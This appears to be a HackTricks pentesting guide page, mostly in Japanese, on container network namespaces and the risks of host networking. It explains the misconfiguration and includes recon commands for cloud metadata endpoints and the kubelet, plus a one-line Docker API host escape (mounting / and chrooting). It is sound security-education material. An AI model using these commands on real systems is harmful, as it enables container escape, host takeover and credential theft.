# ネットワーク名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

ネットワーク名前空間は、インターフェース、IPアドレス、ルーティングテーブル、ARP/ネイバー状態、ファイアウォールルール、ソケット、`/proc/net` のようなファイルの内容など、ネットワークに関連するリソースを分離します。これが、コンテナがホストの実際のネットワークスタックを所有していなくても、自前の `eth0`、ローカルルート、およびループバックデバイスを持っているように見える理由です。

セキュリティの観点では、ネットワークの分離は単なるポートバインディング以上の問題です。プライベートなネットワーク名前空間は、ワークロードが直接観測したり再設定したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナはアプリケーションに露出することを意図されていなかったホストのリスナー、ホストローカルのサービス、ネットワーク制御ポイントを突然閲覧できるようになるかもしれません。

## 動作

新しく作成されたネットワーク名前空間は、インターフェースがアタッチされるまでは空またはほぼ空のネットワーク環境として始まります。コンテナランタイムはその後、仮想インターフェースを作成または接続し、アドレスを割り当て、ルートを設定してワークロードに期待される接続性を提供します。ブリッジベースのデプロイでは、通常コンテナはホストのブリッジに接続された veth-backed なインターフェースを見ます。Kubernetes では、CNI plugins が Pod ネットワーキングの同等の設定を処理します。

このアーキテクチャは、`--network=host` や `hostNetwork: true` がなぜ大きな変化なのかを説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加します。

## ラボ

ほぼ空のネットワーク名前空間は次のように確認できます:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
通常のコンテナとホストネットワークのコンテナを次のように比較できます:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker と Podman は通常、明示的な設定がない限り各コンテナに対してプライベートな network namespace を作成します。Kubernetes は通常各 Pod に対して独自の network namespace を割り当て、Pod 内のコンテナ同士で共有されますがホストとは分離されます。Incus/LXC システムも network-namespace による隔離を豊富に提供し、より多様な仮想ネットワーク構成をサポートすることが多いです。

共通の原則は、プライベートなネットワーキングがデフォルトの隔離境界であり、ホストネットワーキングはその境界からの明示的なオプトアウトであるということです。

## Misconfigurations

最も重要なミスコンフィギュレーションは、単純にホストの network namespace を共有してしまうことです。これは性能や低レベルの監視、利便性のために行われることがありますが、コンテナにとって利用可能な最も明確な境界の一つを取り除いてしまいます。ホストローカルなリスナーにより直接到達できるようになり、localhost のみにバインドされたサービスにアクセスできるようになることがあり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような capabilities は、それらが可能にする操作がホスト自体のネットワーク環境に対して適用されるため、はるかに危険になります。

ネットワーク namespace がプライベートであっても、ネットワーク関連の capabilities を過剰に付与することも別の問題です。プライベート namespace は助けになりますが、raw ソケットや高度なネットワーク制御を無害にするわけではありません。

Kubernetes では、`hostNetwork: true` は Pod レベルのネットワーク分離にどれだけ信頼を置けるかも変えます。Kubernetes のドキュメントは、多くのネットワークプラグインが `hostNetwork` の Pod トラフィックを `podSelector` / `namespaceSelector` マッチングのために正しく区別できず、通常のノードトラフィックとして扱うことがあると述べています。攻撃者の観点から見ると、これは妥協した `hostNetwork` ワークロードを、オーバーレイネットワークのワークロードと同じポリシー前提でまだ制約された通常の Pod と見なすのではなく、ノードレベルのネットワーク足掛かりとして扱うべきことを意味します。

## Abuse

隔離が弱い環境では、攻撃者はホストのリスニングサービスを調査したり、loopback にのみバインドされた管理エンドポイントに到達したり、環境や付与された capabilities に応じてトラフィックをスニッフィング／妨害したり、`CAP_NET_ADMIN` がある場合はルーティングやファイアウォールの状態を再構成したりする可能性があります。クラスタ内では、これにより横移動やコントロールプレーンの偵察も容易になります。

host networking を疑う場合は、まず可視化されているインターフェースやリスナーが隔離されたコンテナネットワークではなくホストに属していることを確認することから始めてください：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
ループバック限定のサービスは、しばしば最初に発見される興味深い対象です：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
ネットワーク機能が利用可能な場合、ワークロードが可視なスタックを検査または変更できるかをテストしてください:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
最新のカーネルでは、ホストネットワークと `CAP_NET_ADMIN` の組み合わせにより、単純な `iptables` / `nftables` の変更を越えてパケット経路が露出する可能性があります。`tc` の qdiscs とフィルタも名前空間スコープなので、共有されたホストネットワーク名前空間ではコンテナから見えるホストのインターフェイスに適用されます。さらに `CAP_BPF` が存在する場合、TC や XDP ローダーなどのネットワーク関連の eBPF プログラムも関係してきます：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
これは、攻撃者が単に firewall rules を書き換えるだけでなく、ホストのインターフェースレベルでトラフィックを mirror、redirect、shape、または drop できる可能性があるため重要です。プライベートな network namespace ではそれらの操作は container view に閉じますが、共有された host namespace ではホストに影響を及ぼします。

In cluster or cloud environments, host networking also justifies quick local recon of metadata and control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完全な例：ホストネットワーキング + ローカルランタイム / Kubelet へのアクセス

ホストネットワーキングは自動的にホストのroot権限を与えるわけではありませんが、多くの場合ノード自身からのみ到達可能に意図されたサービスを公開します。これらのサービスのいずれかが脆弱に保護されていると、ホストネットワーキングは直接的な権限昇格経路になります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet が localhost 上にある:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- ローカル runtime API が適切に保護されていない場合、ホストが直接侵害される可能性がある
- kubelet またはローカルエージェントに到達可能な場合、クラスタの偵察や横移動が行われる可能性がある
- `CAP_NET_ADMIN` と組み合わせると、トラフィックの操作やサービス拒否（DoS）が発生する可能性がある

## Checks

これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートやリスナーが見えているか、そして実際に capabilities を試す前にネットワークの見え方が既にホストに近いかどうかを把握することです。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
ここで興味深い点:

- `/proc/self/ns/net` と `/proc/1/ns/net` がすでにホストと同じように見える場合、コンテナはホストのネットワーク名前空間を共有しているか、別の非プライベートな名前空間を共有している可能性があります。
- `lsns -t net` と `ip netns identify` は、シェルがすでに名前付きまたは永続的な名前空間の中にあり、ホスト側から `/run/netns` オブジェクトと対応付けたい場合に有用です。
- `ss -lntup` は特に役立ちます。ループバック専用のリスナーやローカルの管理用エンドポイントを明らかにします。
- ルーティング、インターフェース名、ファイアウォールのコンテキスト、`tc` の状態、および eBPF のアタッチメントは、`CAP_NET_ADMIN`、`CAP_NET_RAW`、または `CAP_BPF` が存在する場合にさらに重要になります。
- Kubernetes では、`hostNetwork` Pod でサービス名の解決に失敗する場合、それは単に Pod が `dnsPolicy: ClusterFirstWithHostNet` を使用していないことを意味し、サービスが存在しないことを示すとは限りません。

コンテナをレビューする際は、常にネットワーク名前空間を capability set（権限セット）と合わせて評価してください。ホストネットワーキングと強力なネットワーク権限の組み合わせは、ブリッジネットワーキングと限定的なデフォルト権限の組み合わせとは大きく異なります。

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
